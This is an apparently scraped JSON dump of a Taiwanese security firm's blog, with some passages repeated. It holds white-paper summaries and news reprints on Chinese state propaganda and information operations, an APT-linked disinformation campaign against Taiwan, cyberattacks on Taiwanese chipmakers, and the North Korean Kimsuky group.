\nhttp://www.xinhuanet.com/english/2020-02/16/c_138789289.htm\n\n\\[9\\] How China unleashed Twitter bots to spread COVID-19 propaganda in Italy  \nhttps://formiche.net/2020/03/china-unleashed-twitter-bots-covid19-propaganda-italy/\n\n\\[10\\] https://twitter.com/SpokespersonCHN/status/1239041044580188162  \nhttps://twitter.com/zlj517/status/1239112822908276736  \nCGTN: Italians play Chinese national anthem to thank China for its aid  \nhttps://www.youtube.com/watch?v=8ZKsA2jbwlk  \nCCTV: Italians play Chinese national anthem, chanting \"Grazie Cina\"  \nhttps://www.facebook.com/watch/?v=201784281098386\n\n\\[11\\] https://twitter.com/zlj517/status/1238111898828066823\n\n\\[12\\] Coronavirus may have existed in Italy since November: local researcher  \nhttps://news.cgtn.com/news/2020-03-22/Coronavirus-may-have-existed-in-Italy-since-November-local-researcher-P4i2As2OAg/index.html\n\n\\[13\\] Italian doctors saw strange pneumonia cases before China's COVID-19 outbreak, report says   \nhttp://www.china.org.cn/world/Off_the_Wire/2020-03/22/content_75845579.htm\n\n\\[14\\] 'Every Single Individual Must Stay Home': Italy's Coronavirus Surge Strains Hospitals  \nhttps://www.npr.org/2020/03/19/817974987/every-single-individual-must-stay-home-italy-s-coronavirus-deaths-pass-china-s?t=1585131614833\n\n\\[15\\] Beijing twisted my words on coronavirus's Italian origin, says scientist Giuseppe Remuzzi  \nhttps://www.thetimes.co.uk/article/beijing-twisted-my-words-on-coronaviruss-italian-origin-says-scientist-giuseppe-remuzzi-6twwhkrvn","createdAt":"2020-05-24T17:56:37.931Z","updatedAt":"2020-07-02T09:41:31.546Z","__v":0,"id":"5ecab555602fc90040476054"}],"createdAt":"2020-05-24T17:56:37.926Z","updatedAt":"2021-01-08T06:55:16.343Z","__v":1,"topic":"5ecaa02ba792d70040a0d8b3","author":"5eeae9e3163518003f86d917","publish_date":"2020-04-21T02:00:00.000Z","id":"5ecab555602fc90040476053"},{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"},{"publish":true,"enable_form":false,"tags":["5ecf6ceefedd7f004b26974a","5f0e6732163518003f86d9aa","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","5f866d3ada3440005757a928"],"_id":"602e177fc56e80003f985a0e","post_url":"korea-etnews-china-information-warfare-mobilizing-public-opinion-manipulation-and-apt-group","post_name":"【Korea ETNews】China, Information Warfare...

From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"},{"publish":true,"enable_form":false,"tags":["5ecf6ceefedd7f004b26974a","5f0e6732163518003f86d9aa","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","5f866d3ada3440005757a928"],"_id":"602e177fc56e80003f985a0e","post_url":"korea-etnews-china-information-warfare-mobilizing-public-opinion-manipulation-and-apt-group","post_name":"【Korea ETNews】China, Information Warfare...

VPN，連線到企業內網的裝置大幅增加，使用的複雜度增加，對於公司內部負責網路裝置的人員來說，要判讀員工使用 VPN 是否造成異常的難度也大幅提升。\n\n事實上，今年在疫情發生之後，就有許多企業與政府機關，因為 VPN 的使用，被駭客攻入內網造成資安的威脅。「從 VPN 找破口攻擊，就可以直搗核心，直接朝企業內網下手。」蔡松廷說。\n\n一旦內網被入侵，包含公司員工的個人資訊、公司內部資訊，甚至是公司業務或技術研發技術資料都可能被盜、被鎖定或被威脅刪除。一位資安專家透露，今年不乏小型公司遭駭客鎖定勒索，更甚者是有同一間公司反覆被勒索。更糟糕的是，若內部資訊已遭駭客劫持，「大概只有付贖金才有機會拿回資料，或甚至拿不回資料」，專家不諱言。\n\n[點此閱讀完整報導](https://technews.tw/2020/11/19/information-security-special-story/)\n\n\u003cbr\u003e\n\u003cbr\u003e","title":"【TechNews】一鍵風暴》我們與資安風險的距離！數十兆元地下經濟來自你我的輕忽","createdAt":"2020-11-19T01:49:52.052Z","updatedAt":"2020-12-10T08:18:06.426Z","__v":0,"id":"5fb5cf407f8d95003fe7db57"}],"createdAt":"2020-11-19T01:49:52.041Z","updatedAt":"2021-03-17T01:53:08.162Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1605750647/hacking-2300793_1920_0e7d9ba7d5.jpg","id":"5fb5cf407f8d95003fe7db56"},{"publish":true,"enable_form":false,"tags":["5fd1d9839f8bdc004a7fdf55","5fd1d9a19f8bdc004a7fdf56","5fd1d9a99f8bdc004a7fdf57"],"relative_posts":["5fb5cf407f8d95003fe7db56"],"_id":"5fd1d8b09f8bdc004a7fdf4f","post_url":"money-udn-enterprise-ransomware-protection-doppelpaymer-ransomware-group-hit-foxconn","publish_date":"2020-12-09T08:00:00.000Z","post_name":"【經濟日報】鴻海也遭駭客入侵

日以「[全球危險地依賴台灣半導體](https://www.bloomberg.com/news/features/2021-01-25/the-world-is-dangerously-dependent-on-taiwan-for-semiconductors)」為題解析此現象，指出這不僅凸顯台積電在全球供應鏈的重要性及位階，也意味著各國政府領導人非常需要台灣維持民主、不被中國進犯，否則地緣政治紛擾將成為晶片供應瓶頸。\n\n柏林智庫「新責任基金會」（Stiftung Neue Verantwortung）科技與地緣政治專案主任克萊恩漢斯（Jan-Peter Kleinhans）表示，台灣主宰了美國委外晶片製造市場，因此是整個半導體價值產業鏈最重要的潛在關鍵，一旦台灣失效，就會讓整個產業鏈無法運作。\n\n#### 台灣的晶片技術，能抵禦中國進犯？\n\n為應對中國的晶片短缺危機，中國國家主席習近平去年 10 月公布，計畫在 2025 年以前砸下 1.4 兆美元（約新台幣 39 兆元）發展國內半導體產業。然而即使這麼做，也不能完全消除中國對台灣的晶片需求。中國長期不斷挖腳製造晶片的高科技人才，曾是台積電主要高層的梁孟松、蔣尚義，如今是中國中芯國際的共同執行長和副董事長。\n\n有鑑於美國阻礙中國發展晶片，有人猜測北京可能會竊取台灣的晶片智慧財產權技術。台灣網絡安全公司杜浦數位安全（TeamT5）觀察到，美中技術冷戰期間，台灣晶片產業受到的網路攻擊也跟著增加，但無法辨認攻擊是否都由中國當局主使，只能確定這些駭客攻擊的受害者全都是台灣半導體公司。\n\n[點此閱讀完整報導](https://www.storm.mg/article/3426084?mode=whole)\n\n\u003cbr\u003e","title":"【風傳媒】晶片大缺貨，美德日向台灣求援　彭博社：全球對台依賴達到「危險」地步","__v":0,"id":"6010de5ec56e80003f985987"},{"locale":"en","_id":"6010ed3ac56e80003f9859ae","title":"【Bloomberg】The

supply chain\n\nAs China pushes the world to avoid official dealings with Taiwan, leaders across the globe are realizing just how dependent they’ve become on the island democracy.\n\nTaiwan, which China regards as a province, is being courted for its capacity to make leading-edge computer chips. That’s mostly down to Taiwan Semiconductor Manufacturing Co., the world’s largest foundry and go-to producer of chips for Apple Inc. smartphones, artificial intelligence and high-performance computing.\n\n#### Chip Industry Choke Points\nThe industry’s biggest companies are siloed in just a few countries.\n\n\n“TSMC is becoming more and more dominant,” said Kazumi Nishikawa, an official working on technology issues at Japan’s Economy Ministry. “This is something everybody in the chip industry must find a way to deal with.”\n\nChina, in its five-year plan presented in October, is channeling help to the chip industry and other key technologies to the tune of $1.4 trillion through 2025. Yet even that kind of money doesn’t negate the need for Taiwan. Indeed, China has long tapped the island for chip-making talent; two key executives at China’s top chipmaker, Semiconductor Manufacturing International Corp., used to work at TSMC: co-Chief Executive Officer Liang Mong Song and Vice Chairman Chiang Shang-yi.\n\nBut with Washington stymieing China’s progress, there is also speculation that Beijing could resort to stealing chip IP, with Taiwan at the heart of those endeavors.\n\nTaiwanese cyber security firm TeamT5 has observed a steady increase in attacks on the island’s chip industry corresponding to the tightening of U.S. export controls on China. While it’s not always possible to know if these are Chinese state actors, “they are all attacking the Taiwanese semiconductor industry,” Shui Lee, a T5 cyber threat analyst, said.\n\nFellow analyst Linda Kuo said the Taiwanese government was alarmed by a ransomware attack on TSMC in 2018 and had announced plans for some $500 million to help the industry become more aware of cyber security issues.\n\n[Read more](https://www.bloomberg.com/news/features/2021-01-25/the-world-is-dangerously-dependent-on-taiwan-for-semiconductors)\n\n\u003cbr\u003e","__v":0,"id":"6010ed3ac56e80003f9859ae"}],"createdAt":"2021-01-27T03:30:38.565Z","updatedAt":"2021-01-27T05:07:42.144Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1611719931/laura_ockel_n_IE_Hq_G_Sym_RU_unsplash_1d6b915fa5.jpg","id":"6010de5ec56e80003f985986"},{"publish":true,"enable_form":false,"tags":["5ecf6ceefedd7f004b26974a","5f0e6732163518003f86d9aa","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","5f866d3ada3440005757a928"],"_id":"602e177fc56e80003f985a0e","post_url":"korea-etnews-china-information-warfare-mobilizing-public-opinion-manipulation-and-apt-group","post_name":"【Korea ETNews】China, Information Warfare...

It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts. It tracks and monitors versions between the Chinese government and supplies threat intelligence to Asia-Pacific regions such as Taiwan and Japan.\n\n[Read

courtesy of [Black Hat](https://www.blackhat.com/asia-21/)\n\nTeamT5, a Taiwanese cyber threat investigation company, shared the results of a recent study on the North Korean Kimsuky group at the \"Black Hat Asia Conference\" held in Singapore last week. The Kimsuky group is already widely known and is a group that the US CISA has jointly specified with related organizations such as the FBI, and TeamT5's research is the industry's first presentation on Kimsuky this year.\n\nTeamT5 revealed that the Kimsuky group was separated from a single group and divided into two groups, and it seems that each is operated separately for different targets. TeamT5 named them \"CloudDragon\" and \"KimDragon\" respectively, and introduced the target countries and hacking tools.\n\nTeamT5 announced for the first time that the Kimsuky group is focusing on supply chain attacks. The target is cryptocurrency, and the digital wallet of the exchange and its owner. To this end, the Kimsuky group uses a wide range of operating system combinations of PC, Android, and iOS. Currently, portal companies are concentrating on cross-authentication of PC and mobile at the same time for user authentication, so that the same malicious code can be operated in different environments.\n\nTeamT5 researchers schematically presented evidence of the involvement of Kimsuky's group in the domestic cryptocurrency hacking case last October. According to this, it is known that the stolen cryptocurrency was transferred to a Dutch IP address and used for laundry. Even hardware wallets known to be secure appear to have been hacked.\n\nIn addition, they also announced that they are mainly targeting fake login-inducing accounts on portal sites such as Daum, Naver, and Google. Users can receive new user credentials update emails through bait files and hacked websites. Even Microsoft Windows update notifications were used in preliminary attacks. University login websites such as University Y, University E, and University D located in Seoul were used for hacking.\n\nIt was found that the Kimsuky group shifted its focus to not only PC but also mobile environment attacks. Their so-called \"hidden\" agents create SMS messages without the knowledge of cell phone victims, send written texts, and upload files. It means that you can do anything with a controlled phone, regardless of the user's will, such as taking audio or video. If cryptocurrency is stored on a mobile phone or log in through a mobile phone, it can be too easily exposed to hacking.\n\nS\u0026C CEO Han Eun-hye, who is servicing the intelligence information of TeamT5 in Korea, said, \"It is time to detect their movements in advance based on a database that has been tracking the activities of individual hacker groups for a long time to deal with cybersecurity.\" It is necessary to respond to cyber attacks in the future by acquiring intelligence information specific to Asia from among the intelligence information.”\n\n[Read Full

The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies.

From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

To assess the full version of the analysis, please subscribe our report \"Cyber Affairs Biweekly-Update.\"*\n\n### Key Takeaways\n\n1. China has exerted ever greater influence over the globe since the outbreak of the coronavirus. Over the past three months, TeamT5 has been monitoring how China utilizes its cyber strength and propaganda machine to handle the Covid-19 pandemic.\n2. The Chinese authorities have collaborated with telecom firms and tech giants in China, using technologies such as big data to control the public opinion and people's movement. The regime has implemented measures such as digital surveillance, keywords censorship on social media applications, and Health Code System.\n3. Moreover, China has also exercised its propaganda machine to shape both domestic and international narrative of the pandemic. The Chinese officials and Chinese state media have utilized various social media platforms, particularly Weibo and Twitter, to disseminate propaganda to Chinese people and foreign audiences. Some Chinese officials have connived and even promoted online conspiracy theory, which claimed China is not the origin of the coronavirus.\n\n### Blurred Lines Between State and Corps: Telecom Surveillance and Health Code System\n\nThe Chinese Communist Party (CCP) has collaborated with its national tech giants and telecom firms to implement a series of security measures in the name of containing the coronavirus outbreak.\n\nThe regime has elevated its digital control over domestic citizens. In mid-February, China's Ministry of Industry and Information Technology (MIIT) sent a notice to Information and Communications Technology (ICT) service providers, demanding relevant firms to strengthen monitoring and censorship over online public discussion.\\[1\\] The MIIT also announced the utilization of telecom big data analysis in support of the battle against the coronavirus. \\[2\\]\n\nAs the country tried to resume normal operations, the Chinese authorities launched Health Code System, using big data to monitor citizens' health status and then regulate their movement. The Health Code System is developed by the Ant Financial, an affiliate company of the Chinese Alibaba Group, and Tencent in collaboration with the Chinese authorities.\n\nThe system has raised privacy concerns since it connects and integrates databases of government units and private firms, forming a comprehensive surveillance system which contains real name, phone number, ID, address, travel history, health status and contact history. Moreover, only 3 out of 16 Health Code Apps list their user agreement and privacy policy at installation, while others will directly direct users to the registration page to fill out personal information.\\[3\\] This shows that most of the users' data are collected, processed, and shared without informed consent.\n\n### Strategic Distraction and Positive Propaganda Targeting Domestic Citizens\n\nThe authoritarian regime is also in another battle to shape the public opinion about the epidemic. Initially, the Chinese state media employed strategic distraction to mitigate the seriousness of the coronavirus. Before Wuhan Lockdown on January 23, Chinese state media started reporting the Influenza B in the United States.\\[4\\] The topic \"Influenza B outbreak in the US\" (美国爆发乙型流感) reached 500 million views and 31,000 